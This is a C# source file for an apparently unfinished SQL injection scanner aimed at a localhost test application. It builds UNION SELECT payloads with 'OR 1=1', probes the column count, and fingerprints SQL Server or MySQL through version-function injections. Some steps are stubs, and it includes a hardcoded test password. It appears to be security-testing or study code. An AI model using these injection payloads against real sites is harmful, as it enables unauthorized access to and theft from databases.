using System;
using System.Net;

namespace Vizsgalo
{
    public class Scanner
    {
        private static string _unionStart = "'' OR 1=1 UNION SELECT ";
        private static int unionNumber; //it represents how many plus columns we need to write in the union selects
        private static string unionColumnsString = ""; //it represents the union columns (the default value is "" aka no extra column)
        
        private static string _isSqlServer = "@@version;--";
        private static string _isMySql = "VERSION();--";
        private static string _isSqlite = "";
        
        private static string _urlSqlServer = "?id=3&password=akivagyok92";
        private static string _urlMysql = "?id=3&password=akivagyok92";
        
        private static HttpClient _httpClient = new()
        {
            BaseAddress = new Uri("http://localhost:5227/Users/Sqlserver/")
            // BaseAddress = new Uri("http://localhost:5227/Users/Mysql/")
        };

        public static async Task Main()
        {
            Console.WriteLine("Examination started");
            
            //sends a GET request to the given url and writes the response to the console
            await GetAsync(_httpClient);
            
            Console.WriteLine("Examination finished");
        }
        
        //sends a GET request to the given url and writes the response to the console
        static async Task GetAsync(HttpClient httpClient)
        {
            // STEP 1: give the query string keys manually
            Console.WriteLine("Enter the query string parameters (separated with ; characters):");
            string paramsString = Console.ReadLine();
            string[] parameters = paramsString.Split(";");
            
            
            // STEP 2: analyse how many rows does the select return (for preparing the union select)
            HttpResponseMessage unionResponse;
            do
            {
                unionNumber++;
                unionColumnsString = unionColumnsString == "" ? "'1'" : unionColumnsString + ",'1'";
                Console.WriteLine("Trying the union select with " + unionNumber + " column(s)...");
                
                string unionUrl = "?" + parameters[0] + "=" + _unionStart + unionColumnsString + " FROM Users;--"; //TODO
                unionResponse = await httpClient.GetAsync(unionUrl);
                Console.WriteLine(unionResponse.RequestMessage);
                var jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
                Console.WriteLine($"{jsonUnionResponse}\n");
                Console.WriteLine("Status code: " + unionResponse.StatusCode);
            } while (unionResponse.StatusCode != HttpStatusCode.OK);

            unionNumber--; /* we have to decrease the value by one because the code above got the number of columns,
            not the number of EXTRA columns (and we will always use 1 for the injections) */
            unionColumnsString = "";
            for (int i = 0; i < unionNumber; i++)
            {
                unionColumnsString = unionColumnsString == "" ? "'1'" : unionColumnsString + ",'1'";
            }
            
            Console.WriteLine("number of extra columns: " + unionNumber + ", the union section of the query string: " + unionColumnsString);
            
            
            // STEP 3: it checks which database is used on the site
            HttpResponseMessage sqlServerVersionResponse;
            HttpResponseMessage mySqlVersionResponse;
            HttpResponseMessage sqliteVersionResponse;
            string db = "";
            
            // STEP 3.1: it checks if the site uses SQL Server
            Console.WriteLine("Checking for SQL Server version...");
            string sqlServerUrl = "?" + parameters[0] + "=" + _unionStart + unionColumnsString + ", " + _isSqlServer;
            sqlServerVersionResponse = await httpClient.GetAsync(sqlServerUrl);
            Console.WriteLine(sqlServerVersionResponse.RequestMessage);
            var jsonSqlServerVersionResponse = await sqlServerVersionResponse.Content.ReadAsStringAsync();
            // Console.WriteLine($"{jsonSqlServerVersionResponse}\n");
            Console.WriteLine("Status code: " + sqlServerVersionResponse.StatusCode);
            if (sqlServerVersionResponse.StatusCode == HttpStatusCode.OK && jsonSqlServerVersionResponse.Contains("Microsoft SQL Server"))
            {
                db = "sqlserver";
            }
            Console.WriteLine(db);
            // STEP 3.2: it checks if the site uses MySQL - but only if the db wasn't on SQL Server
            if (db != "sqlserver")
            {
                Console.WriteLine("Checking for MySQL version...");
                string mySqlUrl = "?" + parameters[0] + "=" + _unionStart + unionColumnsString + ", " + _isMySql;
                mySqlVersionResponse = await httpClient.GetAsync(mySqlUrl);
                Console.WriteLine(mySqlVersionResponse.RequestMessage);
                var jsonMySqlVersionResponse = await mySqlVersionResponse.Content.ReadAsStringAsync();
                Console.WriteLine($"{jsonMySqlVersionResponse}\n");
                Console.WriteLine("Status code: " + mySqlVersionResponse.StatusCode);
                if (mySqlVersionResponse.StatusCode == HttpStatusCode.OK)
                {
                    db = "mysql";
                }
            }
            
            // STEP 3.3: it checks if the site uses SQLite - but only if the db wasn't on MySQL either
            if (db != "sqlserver" && db != "mysql")
            {
                Console.WriteLine("Checking for SQLite version...");
                //TODO
                db = "sqlite";
            }
            
            
            // STEP 4: get the data using the above information about the database
            if (db == "sqlserver")
            {
                //SQL Server - GET
                Console.WriteLine("Getting data using SQL Server...");
                await SqlServerGet(httpClient);
            } else if (db == "mysql")
            {
                //MySQL - GET
                Console.WriteLine("Getting data using MySQL...");
                await MySqlGet(httpClient);
            } else if (db == "sqlite")
            {
                //SQLite - GET
                //TODO
            }
        }


        // public static string filterResponse()
        // {
        //     
        // }
        
        static async Task SqlServerGet(HttpClient httpClient)
        {
            using HttpResponseMessage response = await httpClient.GetAsync(_urlSqlServer);
            
            Console.WriteLine(response.RequestMessage);
            
            // response.EnsureSuccessStatusCode()
            //     .WriteRequestToConsole();
    
            var jsonResponse = await response.Content.ReadAsStringAsync();
            Console.WriteLine($"{jsonResponse}\n");
        }
        
        
        static async Task MySqlGet(HttpClient httpClient)
        {
            using HttpResponseMessage response = await httpClient.GetAsync(_urlMysql);
            
            Console.WriteLine(response.RequestMessage);
            
            // response.EnsureSuccessStatusCode()
            //     .WriteRequestToConsole();
    
            var jsonResponse = await response.Content.ReadAsStringAsync();
            Console.WriteLine($"{jsonResponse}\n");
        }
    }
}